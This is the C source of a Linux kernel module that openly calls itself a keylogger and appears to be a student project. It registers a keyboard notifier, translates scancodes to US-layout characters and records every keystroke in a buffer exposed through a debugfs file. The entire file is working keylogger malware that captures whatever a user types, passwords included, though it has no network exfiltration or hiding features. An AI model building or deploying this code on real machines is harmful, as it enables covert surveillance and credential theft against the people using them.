#include <linux/debugfs.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/init.h>
#include <linux/input.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>

#define BUFFER_LENGTH (PAGE_SIZE << 2)

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("ARMAN KOCHARYAN AND MOHAMED MOHAMED");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("logs user entered keys on a US keyboard to the system at debugfs");


static struct dentry *f;
static struct dentry *directory;

static ssize_t readKey(struct file *f, char *array, size_t length, loff_t *offset);
static int keylogger_cb(struct notifier_block *n, unsigned long key, void *_param);


//https://www.win.tue.nl/~aeb/linux/kbd/scancodes-1.html
static const char *us_keyboard[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},{"3", "#"},
	{"4", "$"}, {"5", "%"}, {"6", "^"},{"7", "&"}, {"8", "*"}, {"9", "("},
	{"0", ")"}, {"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},{"t", "T"},
  {"y", "Y"}, {"u", "U"}, {"i", "I"},{"o", "O"}, {"p", "P"}, {"[", "{"},
	{"]", "}"},{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},{"j", "J"}, {"k", "K"},
	{"l", "L"}, {";", ":"},{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"},
	{"\\", "|"},{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},{"b", "B"},
	{"n", "N"}, {"m", "M"}, {",", "<"},{".", ">"}, {"/", "?"},
	{"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},{"_LALT_", "_LALT_"},
	{" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},{"F2", "F2"}, {"F3", "F3"},
	{"F4", "F4"}, {"F5", "F5"},{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"},
	{"F9", "F9"},{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"},{"-", "-"},
	{"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},{"_KPD6_", "_RIGHT_"}, {"+", "+"},
	{"_KPD1_", "_END_"},{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"},
	{"_KPD0_", "_INS_"},{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},{"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"},
	{"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"\0", "\0"},
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},{"_PAUSE_", "_PAUSE_"},
};

const struct file_operations keyOperations = {
	.owner = THIS_MODULE,
	.read = readKey,
};

static char keyArr[BUFFER_LENGTH];

static size_t bposition;
static ssize_t readKey(struct file *f, char *array, size_t length, loff_t *offset){
	return simple_read_from_buffer(array, length, offset, keyArr, bposition);
}




static struct notifier_block keylogger_blk = {.notifier_call = keylogger_cb,};
void toString(int i, int shiftButton, char *arr) {

		if (i > KEY_RESERVED && i <= KEY_PAUSE) {
			const char *us_key = (shiftButton == 1)
			? us_keyboard[i][1]
			: us_keyboard[i][0];

			snprintf(arr, 12, "%s", us_key);
		}
}

int keylogger_cb(struct notifier_block *n, unsigned long key, void *_param){

	struct keyboard_notifier_param *param = _param;
	char buffer[12] = {0};
	size_t length;

	pr_debug("key: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
	key, param->down, param->shift, param->value);

	if (!(param->down))
	return NOTIFY_OK;

	toString(param->value, param->shift, buffer);
	length = strlen(buffer);

	if (length < 1)
	return NOTIFY_OK;

	if ((bposition + length) >= BUFFER_LENGTH)
		bposition = 0;

	strncpy(keyArr + bposition, buffer, length);
	bposition = bposition + length;
	return NOTIFY_OK;
}


static int __init keylogger_init(void){

	directory = debugfs_create_dir("keylogger", NULL);
	if (IS_ERR(directory))
		return PTR_ERR(directory);
	if (!directory)
		return -ENOENT;

	f = debugfs_create_file("keys", 0400, directory, NULL, &keyOperations);
	if (!f) {
		debugfs_remove_recursive(directory);
		return -ENOENT;
	}
	register_keyboard_notifier(&keylogger_blk);
	return 0;
}

static void __exit keylogger_exit(void){
	unregister_keyboard_notifier(&keylogger_blk);
	debugfs_remove_recursive(directory);
}

module_init(keylogger_init);
module_exit(keylogger_exit);
